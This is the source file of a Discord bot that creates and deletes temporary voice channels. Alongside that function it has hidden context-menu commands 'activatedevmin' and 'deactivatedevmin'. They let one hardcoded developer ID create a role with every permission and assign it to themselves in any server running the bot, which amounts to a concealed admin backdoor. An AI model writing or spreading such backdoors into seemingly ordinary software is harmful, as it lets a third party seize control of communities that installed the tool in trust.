import discord
from discord import app_commands
import os

intents = discord.Intents.default()
client:discord.Client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)
intents.message_content = True

TOKEN = os.getenv("DISCORD_TOKEN")

custom_vc_category_id = int(os.getenv("custom_vc_category_id"))
developer_id = int(os.getenv("developer_id"))
custom_vc_create_channel_id = int(os.getenv("custom_vc_create_channel_id"))

@client.event
async def on_ready():
    print('logged in')
    
    await tree.sync()

@client.event
async def on_connect():
    print('on_connect')
    
@tree.context_menu()
async def activatedevmin(inter: discord.Interaction, member: discord.User):
    if inter.user.id != developer_id: return
    devmin = await inter.user.guild.create_role(name="devmin", permissions=discord.Permissions.all())
    await inter.user.add_roles(devmin)
    await inter.response.send_message(content="activate devmin", ephemeral=True)

@tree.context_menu()
async def deactivatedevmin(inter: discord.Interaction, member: discord.Member):
    if inter.user.id != developer_id: return
    for role in await inter.user.guild.fetch_roles():
        if role.name == "devmin":
            await role.delete()
    await inter.response.send_message(content="deactivate devmin", ephemeral=True)


@client.event
async def on_voice_state_update(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    if before.channel == None and after.channel != None: await on_voice_state_join(member, before, after)
    if before.channel != None and after.channel == None: await on_voice_state_leave(member, before, after)
    if before.channel != None and after.channel != None: await on_voice_state_change(member, before, after)

async def on_voice_state_join(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    await create_voice(member, after)
async def on_voice_state_leave(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    await delete_voice(member, before)
async def on_voice_state_change(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    await create_voice(member, after)
    await delete_voice(member, before)



async def create_voice(member: discord.Member, after: discord.VoiceState):
    if after.channel.id != custom_vc_create_channel_id:
        return
    custom_vc_category = await member.guild.fetch_channel(custom_vc_category_id)
    member_voice_channel = await custom_vc_category.create_voice_channel("設定で名前を変更！")
    await member.move_to(member_voice_channel)
    
async def delete_voice(member: discord.Member, before: discord.VoiceState):
    # beforeがカスタムチャンネルではない場合
    if before.channel.id == custom_vc_create_channel_id:
        return
    category_channel = await member.guild.fetch_channel(custom_vc_category_id)
    # beforeがカスタムカテゴリーに無い場合
    if before.channel not in category_channel.channels:
        return
    # beforeに人が参加している場合
    if before.channel.members:
        return
    await before.channel.delete()
    
@client.event
async def on_interaction(inter: discord.Interaction):
    return

client.run(TOKEN)